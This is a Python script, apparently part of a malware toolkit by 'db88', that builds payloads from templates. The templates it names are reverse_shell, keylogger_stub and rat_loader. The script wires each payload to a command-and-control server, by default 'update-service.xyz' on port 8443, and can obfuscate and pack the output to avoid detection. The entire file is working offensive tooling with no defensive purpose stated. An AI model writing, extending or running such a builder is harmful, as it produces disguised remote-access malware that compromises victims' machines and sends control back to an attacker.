#!/usr/bin/env python3
"""
builder.py
Main payload generation script. Loads templates, applies obfuscation,
and outputs ready-to-deploy payloads.

Author: db88
"""

import argparse
import yaml
import importlib
import os
import sys
from datetime import datetime

TEMPLATES_DIR = "templates"
DEFAULT_CONFIG = "config.yaml"

def load_config(path=DEFAULT_CONFIG):
    """Load build configuration from YAML."""
    try:
        with open(path, "r") as f:
            return yaml.safe_load(f)
    except FileNotFoundError:
        print(f"[!] Config not found: {path}")
        print("[*] Using hardcoded defaults")
        return {
            "c2": {
                "callback": "update-service.xyz",
                "port": 8443,
                "protocol": "https"
            },
            "builder": {
                "author": "db88",
                "version": "3.1"
            }
        }

def load_template(template_name):
    """Dynamically load a payload template module."""
    template_path = os.path.join(TEMPLATES_DIR, f"{template_name}.py")
    if not os.path.exists(template_path):
        print(f"[!] Template not found: {template_path}")
        sys.exit(1)
    
    spec = importlib.util.spec_from_file_location(template_name, template_path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod

def apply_obfuscation(payload_code, use_packer=False, use_encoder=True):
    """Apply obfuscation layers to payload source."""
    result = payload_code
    
    if use_encoder:
        from obfuscation.string_encoder import encode_strings
        result = encode_strings(result)
        print("[*] String encoding applied")
    
    if use_packer:
        from obfuscation.packer import pack
        result = pack(result)
        print("[*] Packer applied")
    
    return result

def build(template_name, config, obfuscate=False, pack=False):
    """Build a payload from template + config."""
    print(f"\n{'='*60}")
    print(f"  payload-builder v{config.get('builder', {}).get('version', '?')}")
    print(f"  {datetime.utcnow().isoformat()}")
    print(f"{'='*60}\n")
    
    print(f"[*] Template: {template_name}")
    print(f"[*] C2: {config['c2']['protocol']}://{config['c2']['callback']}:{config['c2']['port']}")
    
    # load template
    template = load_template(template_name)
    payload_code = template.generate(
        callback=config["c2"]["callback"],
        port=config["c2"]["port"],
        protocol=config["c2"]["protocol"]
    )
    print(f"[*] Base payload generated ({len(payload_code)} bytes)")
    
    # obfuscate if requested
    if obfuscate or pack:
        payload_code = apply_obfuscation(payload_code, use_packer=pack)
    
    # write output
    outdir = "output"
    os.makedirs(outdir, exist_ok=True)
    outfile = os.path.join(outdir, f"{template_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.py")
    
    with open(outfile, "w") as f:
        f.write(payload_code)
    
    print(f"[+] Payload written to {outfile}")
    print(f"[*] Done.\n")
    return outfile


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="payload-builder — modular payload generator")
    parser.add_argument("--template", required=True, help="Template name (e.g. reverse_shell, keylogger_stub, rat_loader)")
    parser.add_argument("--c2", help="C2 callback address (overrides config)")
    parser.add_argument("--port", type=int, help="C2 port (overrides config)")
    parser.add_argument("--obfuscate", action="store_true", help="Apply string encoding")
    parser.add_argument("--pack", action="store_true", help="Apply packer + encoding")
    parser.add_argument("--config", default=DEFAULT_CONFIG, help="Path to config YAML")
    parser.add_argument("--use-config", action="store_true", help="Use all defaults from config.yaml")
    
    args = parser.parse_args()
    
    cfg = load_config(args.config)
    
    # override config with CLI args if provided
    if args.c2:
        cfg["c2"]["callback"] = args.c2
    if args.port:
        cfg["c2"]["port"] = args.port
    
    build(args.template, cfg, obfuscate=args.obfuscate, pack=args.pack)
